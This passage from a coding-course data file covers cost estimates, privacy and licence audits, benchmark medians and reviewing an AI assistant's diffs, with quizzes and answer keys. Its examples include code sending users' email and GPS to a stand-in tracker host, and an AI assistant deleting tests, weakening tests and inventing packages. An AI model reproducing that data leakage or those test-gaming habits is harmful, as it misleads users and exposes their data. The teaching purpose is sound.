      starter: 'const fs = require("fs")\nconst usage = JSON.parse(fs.readFileSync("usage.json", "utf8"))\n\nfunction costOver(used, free, price) {\n  // the part above the free allowance, times the price (never below 0)\n}\n\nfunction bill(requests, storageGB, egressGB) {\n  const r = costOver(requests / 1000000, 1, 0.40)\n  // storage: 5 GB free, $0.02 per GB\n  // data out: 100 GB free, $0.09 per GB\n  return { r }\n}\n\nconst now = bill(usage.requests, usage.storageGB, usage.egressGB)\nconsole.log("Requests: $" + now.r.toFixed(2))\n// print Storage, Data out, Total ... per month, then At 10x traffic ...\n',
      files: { 'usage.json': '{\n  "requests": 3200000,\n  "storageGB": 12,\n  "egressGB": 180\n}\n' },
      expect: ['Requests: $0.88', 'Storage: $0.14', 'Data out: $7.20', 'Total: $8.22 per month', 'At 10x traffic: $165.54 per month'],
      checks: [
        { expr: 'costOver(50, 100, 0.09)', equals: 0, label: 'Under the free allowance costs 0' },
        { expr: 'costOver(3, 1, 2)', equals: 4, label: 'costOver(3, 1, 2) is 4' },
      ],
      hints: ['`return Math.max(0, used - free) * price`', 'In bill: `const s = costOver(storageGB, 5, 0.02)` and `const e = costOver(egressGB, 100, 0.09)`, then `return { r, s, e, total: r + s + e }`.', 'For 10×: `const big = bill(usage.requests * 10, usage.storageGB, usage.egressGB * 10)`, then print `big.total.toFixed(2)`.'],
    },
    mistakes: [
      { wrong: 'return (used - free) * price', result: 'costOver(50, 100, 0.09) → -4.5', why: 'Below the free line you\'d get a negative cost. Wrap it: `Math.max(0, used - free) * price`.' },
      { wrong: 'costOver(3200000, 1, 0.40)', result: '1279999.6', why: 'The price is per **million** requests. Convert first: `3200000 / 1000000` is 3.2.' },
      { wrong: 'console.log("Total: $" + total)', result: 'Total: $8.219999999999999', why: 'Decimal money in floating point wobbles. Round for display with `toFixed(2)`.' },
    ],
    recap: [
      'List every billable unit: requests, compute, storage, **data out**, seats, builds, emails, AI tokens.',
      '`cost = max(0, used − free) × price`, per unit, then add them up.',
      'Always price the **10×** scenario: free tiers make bills jump.',
      'Hidden costs: data out, overages, pausing free tiers, per-seat pricing, paid-only backups or export, your time, lock-in.',
      'Set a budget alert or spending cap before launch.',
    ],
    questions: [
      { concept: 'cost-analysis', kind: 'mc', q: 'In the TrailPost bill ($0.88 + $0.14 + $7.20), which unit dominates?', options: ['Requests', 'Storage', 'Data out', 'They\'re equal'], answer: 2, why: 'Data out is $7.20 of $8.22. That\'s the one to optimise (smaller images, caching).' },
      { concept: 'cost-analysis', kind: 'mc', q: 'Why did 10× traffic make the bill about 20× bigger?', options: ['Providers add a surcharge for traffic spikes, roughly doubling the price per unit', 'The free allowance is fixed, so almost all the extra usage is billable', 'Storage also grew about 10×, and storage is billed at a higher rate than traffic', 'Prices rise automatically for every account that passes the free tier each month'], answer: 1, why: 'Below the line you pay nothing; above it you pay for everything. Growth crosses the line hard.' },
      { concept: 'cost-analysis', kind: 'mc', q: 'A plan says "unlimited bandwidth". What do you check?', options: ['Nothing: if a plan says unlimited, the provider is legally bound to serve any amount', 'The terms: usually a fair-use limit, then throttling or extra charges', 'The price: unlimited plans are always cheaper per GB than metered ones, so just compare', 'Only the speed, because unlimited just means the bandwidth is faster than on limited plans'], answer: 1, why: '"Unlimited" is a claim. The terms are the evidence.' },
      { concept: 'cost-analysis', kind: 'mc', q: 'Which is a HIDDEN cost an auditor should list?', options: ['The price per extra request, listed in a table on the pricing page', 'Data export only available on the paid plan (lock-in)', 'The monthly price, shown in large type at the top of the pricing page', 'The free allowance of 1M requests, printed beside every plan'], answer: 1, why: 'Exit cost doesn\'t appear on the pricing table, but it decides whether you can ever leave.' },
      { concept: 'cost-analysis', kind: 'mc', q: 'A bug calls a paid API in an endless loop overnight. What would have limited the damage?', options: ['A bigger free tier, so the looping calls stay inside the allowance', 'A budget alert or spending cap set before launch', 'More detailed logging, so you can spot the loop in the logs the next morning', 'Rotating the API key every month, so an old key can\'t be used forever'], answer: 1, why: 'Caps and alerts turn a disaster into an email.' },
      { concept: 'cost-analysis', kind: 'mc', q: 'Service A costs $3/month more than B but saves you about a day of maintenance every month. Which is cheaper in practice?', options: ['B, because $3 is real money while a day of your own time costs nothing', 'A: your time is a real cost', 'They cost the same, because the extra $3 equals the value of a day\'s work', 'Neither: maintenance time can\'t be priced, so the two can\'t be compared'], answer: 1, why: 'Total cost includes your hours, not just the invoice.' },
    ],
  },

  // ───────────────────────────── Trail 5 ─────────────────────────────
  {
    id: 'K-5', type: 'learn', mode: 'phone', xp: 35, mins: 55,
    title: 'Privacy and licences',
    teaches: ['privacy-audit', 'license-check'],
    idea: [
      { h: 'Two checks: privacy and licences', b: "Every audit must answer two questions about things that belong to other people.\n\n**Privacy:** the users' data. What's collected, where does it go, how long is it kept, and does that match what the project promises?\n\n**Licences:** other people's code. Are you actually allowed to use it the way you plan? \"It's on a public repo\" is not permission." },
      { h: 'What you will do', b: "Read the two cards, then go back into TrailPost: compare its privacy policy with what its code really does, and check the licences of the project and its dependencies. (Licence facts here are general education, not legal advice.)" },
    ],
    example: {
      intro: 'Policy vs code, and a licence surprise. Tap through it.',
      lang: 'sh',
      code: '$ cat PRIVACY.md\nWe collect nothing. Your trips stay on your device.\n$ cat src/analytics.js\nconst TRACKER = "https://collect.adwhale.example/v2/event"\n    body: JSON.stringify({ email: user.email, gps: user.lastLocation, event })\n$ cat node_modules/trail-maps/package.json\n  "license": "AGPL-3.0-only"\n$ cat node_modules/trail-utils/package.json\n  "license": "UNLICENSED"',
      steps: [
        { line: 1, note: 'The privacy policy is a claim. Read it first, then go find evidence.' },
        { line: 2, note: '"We collect nothing."' },
        { line: 3, note: 'Now the evidence: what does the code actually send? (Lines trimmed.)' },
        { line: 4, note: 'An outside domain, run by an advertising company.' },
        { line: 5, note: 'Email and GPS location go there. The policy claim is **contradicted**.' },
        { line: 6, note: 'Each installed package keeps its own package.json in node_modules, with its licence.' },
        { line: 7, note: 'AGPL: network copyleft. A web app that modifies this must offer users the source.' },
        { line: 9, note: '"UNLICENSED" means proprietary: no permission to use it at all. Not to be confused with "Unlicense".' },
      ],
    },
    tryit: {
      kind: 'terminal',
      brief: "Check TrailPost's privacy promise and its licences:\n1. `cd trailpost`\n2. `cat PRIVACY.md` (the claims)\n3. `cat src/analytics.js` (what the code really sends, and to whom)\n4. `cat LICENSE` (the project's own licence)\n5. `ls node_modules` to list the installed dependencies\n6. `cat node_modules/trail-maps/package.json` and check its licence\n7. Record it:\n`echo \"MEDIUM: trail-maps is AGPL-3.0, check before modifying\" >> ~/audit-notes.txt`",
      seed: TRAILPOST,
      keys: ['cd ', 'cat ', 'ls ', 'echo ', 'trailpost', 'PRIVACY.md', 'src/analytics.js', 'LICENSE', 'node_modules', 'node_modules/trail-maps/package.json', ' >> ', '~/audit-notes.txt', '"'],
      steps: [
        { kind: 'cwd', path: TP, label: 'You are inside `trailpost`' },
        { kind: 'cmd', re: '^cat PRIVACY\\.md$', label: 'Read the privacy claims' },
        { kind: 'cmd', re: '^cat src/analytics\\.js$', label: 'Read what the analytics code sends' },
        { kind: 'cmd', re: '^cat LICENSE$', label: 'Read the project\'s licence' },
        { kind: 'cmd', re: '^ls node_modules/?$', label: 'List the dependencies in `node_modules`' },
        { kind: 'cmd', re: '^cat node_modules/trail-maps/package\\.json$', label: 'Check trail-maps\' licence' },
        { kind: 'file', path: '/home/climber/audit-notes.txt', contains: 'AGPL', label: 'An AGPL finding is saved in `~/audit-notes.txt`' },
      ],
    },
    mistakes: [
      { wrong: 'Finding: "Privacy: OK (the policy says they collect nothing)."', result: '(src/analytics.js sends email and GPS to an ad company)', why: 'The policy is a claim. The code is the evidence. Always check both.' },
      { wrong: 'Finding: "Licence: MIT, so everything is fine to use."', result: '(trail-maps is AGPL, trail-utils is UNLICENSED)', why: 'The project\'s own licence doesn\'t cover its dependencies. Check every one.' },
      { wrong: 'Finding: "trail-utils: UNLICENSED, no restrictions."', result: '(the opposite: proprietary, no permission)', why: '`UNLICENSED` = all rights reserved. The public-domain-style one is `Unlicense`, without the D.' },
    ],
    recap: [
      '**Privacy audit**: a data inventory: what, why, where stored, sent to whom, kept how long, can users delete it.',
      'The privacy policy is a claim; code, logs and network requests are the evidence.',
      '**Licences**: permissive (MIT, ISC, BSD, Apache-2.0), weak copyleft (LGPL, MPL), strong copyleft (GPL), network copyleft (AGPL), source-available (restricted).',
      'No licence = no permission. `UNLICENSED` = proprietary. Check every dependency, not just the project.',
      'This is education, not legal advice: for real business decisions, ask a lawyer.',
    ],
    questions: [
      { concept: 'privacy-audit', kind: 'mc', q: 'Which is the strongest evidence of where user data goes?', options: ['The privacy policy, because it is a legal document the project can be held to', 'The code\'s requests to outside domains, and the network tab of the live app', 'The app store description, which lists what data the app collects and shares', 'A statement from the founder in the README promising not to share data'], answer: 1, why: 'Policies are claims; requests are what actually happens.' },
      { concept: 'privacy-audit', kind: 'mc', q: '"Server logs are kept for 10 years to improve the service." What\'s the finding?', options: ['None: logs only record technical events, so keeping them for 10 years is harmless to users', 'Retention far longer than any stated need: logs hold IP addresses and more. Ask for a short limit', 'Fine: ten years is the standard period that regulators require for all server logs', 'Only a problem if the logs are public, so the retention period itself isn\'t worth noting'], answer: 1, why: 'Keeping data longer than needed only increases what can leak.' },
      { concept: 'privacy-audit', kind: 'mc', q: 'Why isn\'t a GPS track "anonymous" just because the name was removed?', options: ['It is anonymous: a track has no name on it, so nobody can tell whose it is', 'Where someone sleeps and works every day identifies them', 'GPS files are always encrypted, so nobody can read the places in them', 'Because the file still carries the phone model, and that is what identifies people'], answer: 1, why: 'Location patterns re-identify people easily.' },
      { concept: 'license-check', kind: 'mc', q: 'A repo has great code and no licence file at all. May you copy its code into your app?', options: ['Yes: putting code on a public site means the author accepts it can be reused', 'No: without a licence, all rights are reserved', 'Yes, if you credit the author, since attribution is all a creator can ask for', 'Only for non-commercial projects, because personal use is allowed without a licence'], answer: 1, why: 'Public is not permission. No licence means no right to reuse.' },
      { concept: 'license-check', kind: 'mc', q: 'Which licence family lets you use the code in a closed-source paid product, as long as you keep the notice?', options: ['Copyleft (GPL-2.0, GPL-3.0, AGPL-3.0)', 'Network copyleft (AGPL-3.0, SSPL-1.0)', 'Permissive (MIT, ISC, BSD, Apache-2.0)', 'Unlicensed (UNLICENSED, no LICENSE file)'], answer: 2, why: 'Permissive licences ask little beyond keeping the copyright and licence notice.' },
      { concept: 'license-check', kind: 'mc', q: 'Your web app uses a MODIFIED AGPL-3.0 library, and users reach the app over the internet. What does AGPL ask of you?', options: ['Nothing, since you never gave anyone a copy; you only ran it on your own server', 'Offer those users the source code of the modified program', 'Pay the author a licence fee, since AGPL is the licence for commercial use', 'Take the app off the public internet, because AGPL only allows private use'], answer: 1, why: 'AGPL closes the server gap: network users get the right to the modified source.' },
      { concept: 'license-check', kind: 'mc', q: 'A project\'s code is public, but its licence says "free except for offering it as a hosted service". What kind is that?', options: ['Permissive open source: the code is public, and a hosting limit is a normal condition', 'Source-available: readable, but use is restricted', 'Public domain: the authors have shared the code freely with only one small exception', 'GPL: the code is public, and GPL asks you to share your source if you host it'], answer: 1, why: 'Visible code isn\'t automatically open source. Read the actual terms.' },
      { concept: 'license-check', kind: 'mc', q: 'Does the GPL forbid selling software?', options: ['Yes: GPL code must be given away free of charge, and any fee breaks the licence', 'No: you may sell it, but when you distribute it you must provide the source under the GPL', 'Only sale to businesses is banned: giving copies away to anyone is allowed', 'Yes, unless you first ask the original authors for permission to sell it'], answer: 1, why: 'GPL is about sharing source when you distribute, not about price.' },
    ],
  },

  // ───────────────────────────── Trail 6 ─────────────────────────────
  {
    id: 'K-6', type: 'learn', mode: 'phone', xp: 35, mins: 50,
    title: 'Benchmarks, and writing the report',
    teaches: ['benchmark-skepticism', 'audit-report'],
    idea: [
      { h: 'Checking benchmarks and writing the report', b: "\"10× faster\" sounds convincing because it's a number. But which run, measured how, by whom? A benchmark that quotes only the single best run is like reporting a climber's fastest-ever time as their normal pace.\n\nThe last step is the **report**. An audit nobody can read changes nothing, so the report turns your evidence into a decision." },
      { h: 'Check the numbers yourself', b: "Read the two cards. Then you'll parse TrailPost's own `BENCHMARKS.md` in code, compute the **median** for both apps, and see what happens to the \"10× faster\" claim when you stop cherry-picking." },
    ],
    example: {
      intro: 'The median, the honest middle. Tap through it.',
      lang: 'js',
      code: 'function median(nums) {\n  const s = [...nums].sort((a, b) => a - b)\n  const mid = Math.floor(s.length / 2)\n  return s.length % 2 ? s[mid] : (s[mid - 1] + s[mid]) / 2\n}\n\nconst runs = [410, 395, 22, 405, 400]\nconsole.log("best " + Math.min(...runs) + ", median " + median(runs))',
      steps: [
        { line: 1, note: 'The median: sort the numbers, take the middle one.' },
        { line: 2, note: '`[...nums]` copies the array first, so sorting doesn\'t change the original. `(a, b) => a - b` sorts as numbers; the default sort compares text.' },
        { line: 3, note: 'The middle index. For 5 items, `Math.floor(5 / 2)` is 2: the third item.' },
        { line: 4, note: 'Odd count: the middle item. Even count: the average of the two middle items.' },
        { line: 7, note: 'Five runs. One of them (22) is wildly faster: probably a cached request.' },
        { line: 8, note: '`Math.min(...runs)` spreads the array into separate numbers. Output: `best 22, median 400`. Same data, two very different stories.' },
      ],
    },
    tryit: {
      kind: 'code',
      prompt: "The sandbox has TrailPost's `BENCHMARKS.md`: five runs of trip load time (ms, lower is better) for TrailPost and RouteBook. The README claims **10× faster** using each app's best run.\n1. Finish `median(nums)` (sort as numbers!)\n2. The parsing is done. Print the best and median for each app, then compare\n\nExpected output:\n`trailpost: best 22 ms, median 400 ms`\n`routebook: best 220 ms, median 230 ms`\n`Best runs: trailpost 10.0x faster`\n`Medians: routebook 1.7x faster`",
      starter: 'const fs = require("fs")\nconst text = fs.readFileSync("BENCHMARKS.md", "utf8")\n\n// Table rows look like: | 1   | 410       | 220       |\nconst tp = [], rb = []\nfor (const line of text.split("\\n")) {\n  const cells = line.split("|").map(c => c.trim())\n  if (cells.length < 4 || isNaN(Number(cells[1])) || cells[1] === "") continue\n  tp.push(Number(cells[2]))\n  rb.push(Number(cells[3]))\n}\n\nfunction median(nums) {\n  // copy, sort as numbers, return the middle (or the average of the two middles)\n}\n\n// print the four lines\n// ratios: (220 / 22).toFixed(1) and (median of trailpost / median of routebook).toFixed(1)\n',
      files: { 'BENCHMARKS.md': '# TrailPost vs RouteBook: trip load time (ms, lower is better)\n\n| run | trailpost | routebook |\n|-----|-----------|-----------|\n| 1   | 410       | 220       |\n| 2   | 395       | 240       |\n| 3   | 22        | 230       |\n| 4   | 405       | 235       |\n| 5   | 400       | 225       |\n\nResult: TrailPost is 10x faster (22 ms vs 220 ms)!\n' },
      expect: ['trailpost: best 22 ms, median 400 ms', 'routebook: best 220 ms, median 230 ms', 'Best runs: trailpost 10.0x faster', 'Medians: routebook 1.7x faster'],
      checks: [
        { expr: 'median([10, 9, 100])', equals: 10, label: 'median sorts as numbers' },
        { expr: 'median([5, 1, 9, 7])', equals: 6, label: 'median of an even count averages the middle two' },
      ],
      hints: ['`const s = [...nums].sort((a, b) => a - b)` then `const mid = Math.floor(s.length / 2)`.', '`return s.length % 2 ? s[mid] : (s[mid - 1] + s[mid]) / 2`', 'Best is `Math.min(...tp)`. Line 3: `"Best runs: trailpost " + (Math.min(...rb) / Math.min(...tp)).toFixed(1) + "x faster"`. Line 4: `"Medians: routebook " + (median(tp) / median(rb)).toFixed(1) + "x faster"`.'],
    },
    mistakes: [
      { wrong: 'const s = nums.sort()', result: 'median([10, 9, 100]) → 100', why: 'The default sort compares as text, so "100" comes before "9". Sort numbers with `(a, b) => a - b`.' },
      { wrong: 'Using the average: (410 + 395 + 22 + 405 + 400) / 5', result: '326.4', why: 'One cached 22 ms run drags the average far below what users normally see. The median (400) isn\'t fooled.' },
      { wrong: 'Report summary on the last page, after 12 pages of findings', result: '(the reader never reaches the verdict)', why: 'Bottom line up front: verdict and top findings first.' },
    ],
    recap: [
      'Ask of every benchmark: what was measured, by whom, same conditions, how many runs, which run is shown, warm or cold?',
      'Quote the **median** (and **p95**), not the best run. Sort numbers with `(a, b) => a - b`.',
      'Best of all, measure it yourself with your own data.',
      '**Report**: title and version, summary (verdict first), scope and method, findings (severity, evidence, impact, fix), positives, verdict.',
      'Mask secrets in reports, and disclose security problems privately to maintainers first.',
    ],
    questions: [
      { concept: 'benchmark-skepticism', kind: 'mc', q: 'A benchmark quotes only each tool\'s single fastest run. What\'s that called?', options: ['Load testing', 'Cherry-picking', 'Caching', 'Profiling'], answer: 1, why: 'Choosing only the results that support your story is cherry-picking.' },
      { concept: 'benchmark-skepticism', kind: 'mc', q: 'One run took 22 ms; the other four took about 400 ms. What probably happened?', options: ['The code was optimised by the browser after one run, so 22 ms is the new normal', 'That request was served from a cache (a warm run)', 'The clock measured it wrongly, since timers aren\'t exact enough below 50 ms', 'Four of the runs were slowed by the testing tool itself, so 22 ms is the true time'], answer: 1, why: 'Repeated requests often hit a cache and look impossibly fast.' },
      { concept: 'benchmark-skepticism', kind: 'mc', q: 'Why prefer the median over the average for load times?', options: ['It\'s always the smaller number, so results look better', 'One freak outlier can\'t drag it', 'It\'s easier to fake, because you only have to change one value', 'It uses every single run, so no result is ever left out'], answer: 1, why: 'The median is the middle value, so extremes don\'t move it.' },
      { concept: 'benchmark-skepticism', kind: 'mc', q: 'What does "p95 = 300 ms" mean?', options: ['95% of requests took exactly 300 ms', '95% of requests were faster than 300 ms', 'The app is 95% fast', 'It failed 5% of the time'], answer: 1, why: 'p95 shows what your slower regular users experience.' },
      { concept: 'audit-report', kind: 'mc', q: 'What goes FIRST in an audit report?', options: ['The full list of commands you ran, so the reader can repeat your steps', 'A summary with the verdict and top findings', 'The detailed findings in the order you discovered them, so readers follow your journey', 'A glossary of terms, so non-technical readers can follow the rest'], answer: 1, why: 'Bottom line up front: many readers stop after the summary.' },
      { concept: 'audit-report', kind: 'mc', q: 'Which parts does every finding need?', options: ['A title, a date and the name of the person who found it', 'Severity, evidence, impact and a fix', 'Severity, a screenshot and the name of the file\'s author', 'Only a severity and a short title, so the report stays scannable'], answer: 1, why: 'Evidence makes it checkable, impact makes it understandable, the fix makes it actionable.' },
      { concept: 'audit-report', kind: 'mc', q: 'You found a live password in someone\'s public project. What\'s the responsible move?', options: ['Post a redacted screenshot publicly so the maintainers see it and everyone is warned', 'Report it privately to the maintainers (check SECURITY.md) and mask it in your report', 'Log in once to confirm it still works, then report it so they know it\'s live', 'Quietly leave it, since a leak in someone else\'s project isn\'t your responsibility'], answer: 1, why: 'Responsible disclosure: tell them privately, give them time to fix, never spread the secret.' },
    ],
  },

  // ───────────────────────────── Trail 7 (id K-14, added later): working with an AI coding assistant ─────────────────────────────
  {
    id: 'K-14', type: 'learn', mode: 'phone', xp: 35, mins: 55,
    title: 'Working with an AI coding assistant',
    teaches: ['ai-coding-assistant', 'reviewing-ai-code', 'package-hallucination'],
    uses: ['git-diff', 'git-restore', 'dependency-audit', 'secret-scan', 'edge-cases'],
    idea: [
      { h: 'It writes fast. You still answer for what ships.', b: "An **AI coding assistant** (also called a **coding agent**) reads your project and writes or changes code from your description. It is quick, and it is often right. It is also just as confident when it is wrong. It can invent a function that doesn't exist, use an old version of a library, or write code that handles the one example you gave and breaks on the next input.\n\nSo the skill is not typing prompts. It is **checking the result**. The rule for this trail: nothing the assistant wrote counts until you have read it and run it. That is the audit method you learned in this camp, aimed at code you did not write yourself." },
      { h: 'Before you start, and when to stop', b: "Do three things before each session: **commit** your work so you can roll back, give a **brief** (what you want, the limits, which files, how you'll know it's done), and keep secrets out of what you paste. Ask for **small changes**, one at a time.\n\nKnow when to stop. If you've asked three times and it keeps going in circles, or the fix is one line you already understand, do it yourself. Never ship code you can't explain." },
    ],
    example: {
      intro: 'You asked an assistant to turn trip names into URL slugs. Here is the check you do afterwards. Tap through it.',
      lang: 'sh',
      code: "$ git commit -am \"Checkpoint before the assistant works\"\n$ git diff --stat\n package.json        | 1 +\n src/server.js       | 6 +++++-\n test/server.test.js | 6 ------\n 3 files changed, 6 insertions(+), 7 deletions(-)\n$ git diff test/server.test.js\n-test('rejects a missing name', () => {\n-  expect(() => addTrip({})).toThrow()\n-})\n$ npm test",
      steps: [
        { line: 1, note: 'This ran **before** the assistant started. Now every change it makes can be undone: `git restore .` throws away all uncommitted edits to tracked files.' },
        { line: 2, note: 'After it finished, look at **which files changed** before you read a single line. `--stat` is a summary.' },
        { line: 3, note: 'A new line in `package.json`: a new dependency. You asked for a slug, so check that package carefully.' },
        { line: 4, note: '`src/server.js` is where you expected changes: five lines added, one removed.' },
        { line: 5, note: 'The test file shows **six lines removed and none added**. The assistant did not touch the tests you asked it to leave alone. It deleted some.' },
        { line: 6, note: 'The totals. Deleted lines matter as much as added ones.' },
        { line: 7, note: 'Read the diff of the suspicious file. (Git prints a few header lines first, left out here.)' },
        { line: 8, note: 'A whole test is gone: the one that checks a missing name is rejected. A change that deletes the test for a bug is not a fix.' },
        { line: 11, note: 'Then run the tests yourself, and use the app by hand. "All tests pass" means little when the failing tests were deleted. Compare the number of tests with the number before.' },
      ],
    },
    tryit: {
      kind: 'code',
      prompt: "An assistant made a change. The sandbox has its change as a diff (`change.diff`, the way `git diff` prints it) and the project's `package.json`. Finish the reviewer script. A diff line starting with `+` was added, and one starting with `-` was removed. Lines starting with `+++` or `---` are file headers, not changes.\n\n1. `removedTest(line)`: true for a removed test line: it starts with `-`, then optional spaces, then `test(` or `it(`\n2. `hasSecret(line)`: true for an **added** line that matches `SECRET` (a hard-coded key, token or password)\n3. `unknownPackage(line)`: for an **added** line with `require('name')`, return the name when it is not relative (doesn't start with `.`), not in `BUILTIN` and not in `deps`. Otherwise return `null`\n4. In the loop, print one line per problem, using the line number `n`, and count it\n\nExpected output:\n`Line 7: package not in package.json: slugify-pro`\n`Line 10: possible hard-coded secret`\n`Line 24: a test was removed`\n`Line 27: a test was removed`\n`4 problems found`",
      starter: "const fs = require('fs')\n\nconst pkg = JSON.parse(fs.readFileSync('package.json', 'utf8'))\nconst deps = Object.keys(pkg.dependencies)\nconst BUILTIN = ['fs', 'path', 'http', 'os', 'crypto']\nconst SECRET = /(key|secret|token|password)\\w*\\s*=\\s*[\"'][^\"']{6,}[\"']/i\n\n// true for a removed test line: \"-\", optional spaces, then test( or it(\nfunction removedTest(line) {\n}\n\n// true for an ADDED line (starts with \"+\" but not \"+++\") that matches SECRET\nfunction hasSecret(line) {\n}\n\n// for an ADDED line with require('name'): the name if it is not relative,\n// not built in and not in deps. Otherwise null\nfunction unknownPackage(line) {\n}\n\nconst lines = fs.readFileSync('change.diff', 'utf8').split('\\n')\nlet problems = 0\nlines.forEach((line, i) => {\n  const n = i + 1\n  // print one of these for each problem, and add 1 to problems:\n  //   Line 7: package not in package.json: slugify-pro\n  //   Line 10: possible hard-coded secret\n  //   Line 24: a test was removed\n})\nconsole.log(problems + ' problems found')\n",
      files: {
        'package.json': '{\n  "name": "trailpost",\n  "dependencies": {\n    "dayjs": "^1.11.13",\n    "express": "^4.18.2"\n  }\n}\n',
        'change.diff': ['diff --git a/src/server.js b/src/server.js', '--- a/src/server.js', '+++ b/src/server.js', '@@ -1,6 +1,11 @@', " const express = require('express')", "+const dayjs = require('dayjs')", "+const slugify = require('slugify-pro')", "+const db = require('./db')", ' const app = express()', "+const API_KEY = 'trail-8841-live-key'", '+const PORT = process.env.PORT || 3000', ' ', " app.get('/trips', (req, res) => {", '-  res.json(loadTrips())', '+  res.json(loadTrips().map(t => slugify(t.name)))', ' })', 'diff --git a/test/server.test.js b/test/server.test.js', '--- a/test/server.test.js', '+++ b/test/server.test.js', '@@ -4,9 +4,6 @@', " test('health answers ok', () => {", "   expect(health()).toBe('ok')", ' })', "-test('returns an empty list when there are no trips', () => {", '-  expect(loadTrips()).toEqual([])', '-})', "-test('rejects a missing name', () => {", '-  expect(() => addTrip({})).toThrow()', '-})', ''].join('\n'),
      },
      expect: ['Line 7: package not in package.json: slugify-pro', 'Line 10: possible hard-coded secret', 'Line 24: a test was removed', 'Line 27: a test was removed', '4 problems found'],
      checks: [
        { expr: "removedTest(\"-test('a', () => {\")", equals: true, label: 'a removed test line is flagged' },
        { expr: "removedTest(\"+test('a', () => {\")", equals: false, label: 'an added test line is fine' },
        { expr: "hasSecret(\"+const token = 'abcdef123'\")", equals: true, label: 'an added secret is flagged' },
        { expr: "hasSecret(\"-const token = 'abcdef123'\")", equals: false, label: 'a removed secret is not flagged' },
        { expr: "unknownPackage(\"+const x = require('left-padder')\")", equals: 'left-padder', label: 'an unknown package is named' },
        { expr: "unknownPackage(\"+const x = require('express')\")", equals: null, label: 'a package in package.json is fine' },
      ],
      hints: [
        "`return /^-\\s*(test|it)\\(/.test(line)` checks a removed test. For a secret: `return line.startsWith('+') && !line.startsWith('+++') && SECRET.test(line)`.",
        "For packages: `if (!line.startsWith('+') || line.startsWith('+++')) return null`, then `const m = line.match(/require\\(['\"]([^'\"]+)['\"]\\)/)`. If there's no match, return null. The name is `m[1]`.",
        "Return null when `name.startsWith('.')`, `BUILTIN.includes(name)` or `deps.includes(name)`. Otherwise return `name`.",
        "In the loop: `if (removedTest(line)) { console.log('Line ' + n + ': a test was removed'); problems++ } else if (hasSecret(line)) { … } else { const name = unknownPackage(line); if (name) { … } }`.",
      ],
    },
    mistakes: [
      { wrong: "$ npm install slugify-pro   (copied from the assistant's code)", result: 'npm error 404 Not Found - GET https://registry.npmjs.org/slugify-pro - Not found', why: 'The assistant made the name up. Look a package up with `npm view <name>` before installing it. If a name does exist, anyone could have published it, so check its age, maintainer and repository.' },
      { wrong: 'items.sortBy(i => i.name)', result: 'TypeError: items.sortBy is not a function', why: 'Arrays have no `sortBy` method. The assistant mixed up a library function with a built-in one. Run the code and read the error: an invented method fails at once.' },
      { wrong: '-  expect(total([1, 2, 3])).toBe(6)\n+  expect(total([1, 2, 3])).toBeTruthy()', result: '(the test passes whatever total returns, even 0 or 7)', why: 'The assistant weakened a failing test instead of fixing the code. Read test changes as closely as code changes.' },
      { wrong: 'Pasting your whole .env file into the chat to get help', result: '(your real keys now sit on another company\'s servers)', why: 'Replace values with placeholders such as `API_KEY=<redacted>` first. If a real key was pasted, treat it as leaked: revoke it and make a new one.' },
    ],
    recap: [
      'A good **brief** has a goal, the constraints, the files, what done looks like and how to test it. Ask for **small changes**, one at a time.',
      '**Commit before** you start so you can roll back (`git restore .`). Keep **secrets out of prompts**: paste placeholders, never real keys.',
      '**Read the diff:** `git diff --stat` first to see which files changed, then every changed line, deleted ones included. Anything you did not ask for needs an explanation.',
      '**Verify yourself:** run the tests and the app, and try edge cases. "Done" and "all tests pass" are claims, not evidence.',
      'Common failures: **invented functions and packages**, outdated APIs, code that passes the example but fails other inputs, deleted or weakened tests, hard-coded secrets.',
      '**Package hallucination:** an invented package name can be claimed by an attacker, and install scripts run on your machine. Look a package up first (`npm view`) and prefer well-known ones. Stop and do it yourself when you are going in circles or can\'t explain the code.',
    ],
    questions: [
      { concept: 'ai-coding-assistant', kind: 'mc', q: 'Which request is the best brief for an AI coding assistant?', options: ['"Make the trip page better."', '"Add slug(name) in src/slug.js: lowercase it and replace spaces with hyphens. No new packages. slug(\'Hello World\') must return \'hello-world\'. I will run npm test."', '"Write whatever slug code you think is best and tell me when it works."', '"Rewrite the whole project so it is cleaner."'], answer: 1, why: 'It names the goal, the file, the limits, what done looks like and how it will be tested.' },
      { concept: 'ai-coding-assistant', kind: 'mc', q: 'You are about to let an assistant change many files. What is the safest first step?', options: ['Commit your current work, so you can roll back', 'Turn off your tests, so they cannot slow it down', 'Copy your .env into the chat, so it has full context', 'Ask for the whole feature in one go, to save time'], answer: 0, why: 'A commit gives you a clean point to return to. `git restore .` then undoes its uncommitted edits.' },
      { concept: 'ai-coding-assistant', kind: 'mc', q: 'You want help debugging a config file that holds a real API key. What should you paste?', options: ['The file as it is, since the assistant needs the real values', 'The file with the real values replaced by placeholders such as <redacted>', 'Only the key, because that is the part that matters', 'Nothing at all: assistants cannot read config files'], answer: 1, why: 'The structure is what it needs. Real secrets sent in a prompt leave your machine.' },
      { concept: 'ai-coding-assistant', kind: 'mc', q: 'The assistant has now gone in circles three times on a bug, and you can see the fix is one line you understand. What do you do?', options: ['Ask a fourth time with the same words, since it may work this time', 'Make the one-line fix yourself', 'Let it rewrite the whole file, so the bug cannot come back', 'Delete the test that fails, so the bug stops showing'], answer: 1, why: 'Knowing when to stop is part of the skill. A change you understand beats another round of guessing.' },
      { concept: 'reviewing-ai-code', kind: 'mc', q: 'The assistant says "Done! All tests pass." What do you do?', options: ['Merge it: it ran the tests, so that is checked', 'Read the diff and run the tests and the app yourself', 'Run only the one test it says it fixed', 'Ask it to say again that the tests pass'], answer: 1, why: '"Done" is a claim. Your own run and your own read of the diff are the evidence.' },
      { concept: 'reviewing-ai-code', kind: 'mc', q: 'You ask for one new route. Afterwards `git diff --stat` shows this. What stands out?', code: ' package.json        |  2 ++\n src/routes.js       |  9 +++++++++\n test/routes.test.js | 14 --------------\n 3 files changed, 11 insertions(+), 14 deletions(-)', options: ['Nothing: three files for one route is normal', 'The test file only lost lines, so tests were deleted', 'routes.js has the most added lines', 'The changes add up to more insertions than deletions'], answer: 1, why: 'Fourteen lines removed from a test file and none added means tests went missing. Open that diff.' },
      { concept: 'reviewing-ai-code', kind: 'mc', q: 'This diff line is in a test file. What did the assistant do?', code: "-  expect(total([1, 2, 3])).toBe(6)\n+  expect(total([1, 2, 3])).toBeTruthy()", options: ['Made the test stricter', 'Made the test weaker: it now passes for any non-zero result', 'Fixed a typo in the test', 'Nothing: both lines test the same thing'], answer: 1, why: '`toBe(6)` demands one exact answer. `toBeTruthy()` accepts almost anything, so a wrong total can pass.' },
